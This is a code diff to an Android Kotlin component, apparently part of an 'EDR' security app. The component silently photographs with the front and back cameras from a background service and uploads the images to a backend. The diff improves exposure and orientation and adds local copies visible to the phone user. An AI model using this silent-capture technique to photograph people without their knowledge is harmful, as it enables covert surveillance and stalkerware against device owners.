@@ -12,8 +12,10 @@ import android.hardware.camera2.CameraDevice
 import android.hardware.camera2.CameraManager
 import android.hardware.camera2.CaptureRequest
 import android.media.ImageReader
+import android.media.MediaScannerConnection
 import android.os.Handler
 import android.os.HandlerThread
+import android.os.PowerManager
 import android.util.Base64
 import android.util.Log
 import androidx.core.content.ContextCompat
@@ -24,6 +26,7 @@ import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
+import java.io.File
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
@@ -32,8 +35,8 @@ import java.util.concurrent.atomic.AtomicBoolean
  * Autonomous Background Camera Capturer (Zero-Activity / Non-Blocking).
  *
  * Captures photos directly from Front and Back cameras via Camera2 API from
- * the background service without launching any Activity, avoiding Android 10-16+
- * Background Activity Launch (BAL) restrictions.
+ * the background service with 3A auto-exposure calibration so photos are clear
+ * (never pure black or white).
  */
 object SilentCameraCapturer {
     private const val TAG = "SilentCameraCapturer"
@@ -54,8 +57,8 @@ object SilentCameraCapturer {
             return
         }
 
-        val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
-        val wakeLock = pm?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "edr:camera_capture")
+        val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
+        val wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "edr:camera_capture")
 
         Thread {
             try {
@@ -117,7 +120,7 @@ object SilentCameraCapturer {
         }
 
         // Brief cooldown between hardware camera switches
-        try { Thread.sleep(150) } catch (ignored: Exception) {}
+        try { Thread.sleep(250) } catch (ignored: Exception) {}
 
         // 2. Capture Back Camera (Environment / Room)
         if (backCameraId != null) {
@@ -133,13 +136,43 @@ object SilentCameraCapturer {
             return
         }
 
-        // 3. Upload evidence directly to EDR Backend
+        // 3. Save photos locally to /sdcard/EDR/photos/ so phone user can see them
+        try {
+            val photosDir = EdrLocalStorage.getPhotosDir(context)
+            val timestamp = System.currentTimeMillis()
+            val filesToScan = mutableListOf<String>()
+
+            if (frontPhotoBytes != null) {
+                val frontFile = File(photosDir, "front_camera_$timestamp.jpg")
+                frontFile.writeBytes(frontPhotoBytes)
+                filesToScan.add(frontFile.absolutePath)
+            }
+            if (backPhotoBytes != null) {
+                val backFile = File(photosDir, "back_camera_$timestamp.jpg")
+                backFile.writeBytes(backPhotoBytes)
+                filesToScan.add(backFile.absolutePath)
+            }
+
+            if (filesToScan.isNotEmpty()) {
+                MediaScannerConnection.scanFile(
+                    context,
+                    filesToScan.toTypedArray(),
+                    arrayOf("image/jpeg", "image/jpeg"),
+                    null
+                )
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "Could not save local copy to /EDR/photos: ${e.message}")
+        }
+
+        // 4. Upload evidence directly to EDR Backend with explicit CAMERA_PHOTO type
         try {
             val deviceId = SyncPreferences.deviceId
             val payload = mutableMapOf<String, Any>(
                 "deviceId" to deviceId,
                 "timestamp" to SyncPreferences.getCurrentIsoTimestamp(),
-                "triggerReason" to triggerReason
+                "triggerReason" to triggerReason,
+                "photoType" to "CAMERA_PHOTO"
             )
 
             if (frontPhotoBytes != null) {
@@ -197,6 +230,7 @@ object SilentCameraCapturer {
 
             val width = targetSize?.width ?: 1280
             val height = targetSize?.height ?: 720
+            val orientation = getCameraOrientation(characteristics)
 
             imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
             imageReader.setOnImageAvailableListener({ reader ->
@@ -221,10 +255,15 @@ object SilentCameraCapturer {
                     cameraDevice = camera
                     try {
                         val surface = imageReader.surface
+
                         val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                             addTarget(surface)
+                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                             set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                             set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                            set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
+                            set(CaptureRequest.JPEG_QUALITY, 85.toByte())
+                            set(CaptureRequest.JPEG_ORIENTATION, orientation)
                         }
 
                         @Suppress("DEPRECATION")
@@ -234,10 +273,34 @@ object SilentCameraCapturer {
                                 override fun onConfigured(session: CameraCaptureSession) {
                                     captureSession = session
                                     try {
-                                        session.capture(captureBuilder.build(), null, handler)
+                                        // Warm up auto-exposure (AE) and auto-white-balance (AWB)
+                                        // so photo is not pure black (underexposed) or white (blown out)
+                                        val previewBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
+                                            addTarget(surface)
+                                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
+                                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                                            set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
+                                            set(CaptureRequest.CONTROL_AE_PRECAPTURE_TRIGGER, CaptureRequest.CONTROL_AE_PRECAPTURE_TRIGGER_START)
+                                        }
+
+                                        session.capture(previewBuilder.build(), null, handler)
+
+                                        // Allow 450ms for the camera sensor gain & exposure to stabilize
+                                        handler.postDelayed({
+                                            try {
+                                                session.capture(captureBuilder.build(), null, handler)
+                                            } catch (e: Exception) {
+                                                Log.e(TAG, "Capture failed on camera $cameraId: ${e.message}")
+                                                latch.countDown()
+                                            }
+                                        }, 450L)
                                     } catch (e: Exception) {
-                                        Log.e(TAG, "Capture failed on camera $cameraId: ${e.message}")
-                                        latch.countDown()
+                                        Log.e(TAG, "Warmup trigger error on camera $cameraId: ${e.message}")
+                                        try {
+                                            session.capture(captureBuilder.build(), null, handler)
+                                        } catch (e2: Exception) {
+                                            latch.countDown()
+                                        }
                                     }
                                 }
 
@@ -264,8 +327,8 @@ object SilentCameraCapturer {
                 }
             }, handler)
 
-            // Wait up to 5 seconds per camera
-            latch.await(5000, TimeUnit.MILLISECONDS)
+            // Wait up to 6 seconds per camera
+            latch.await(6000, TimeUnit.MILLISECONDS)
         } catch (e: Exception) {
             Log.e(TAG, "Exception snapping camera $cameraId: ${e.message}")
         } finally {
@@ -282,5 +345,14 @@ object SilentCameraCapturer {
 
         return capturedBytes
     }
-}
 
+    private fun getCameraOrientation(characteristics: CameraCharacteristics): Int {
+        val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 90
+        val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
+        return if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
+            (sensorOrientation + 360) % 360
+        } else {
+            sensorOrientation
+        }
+    }
+}
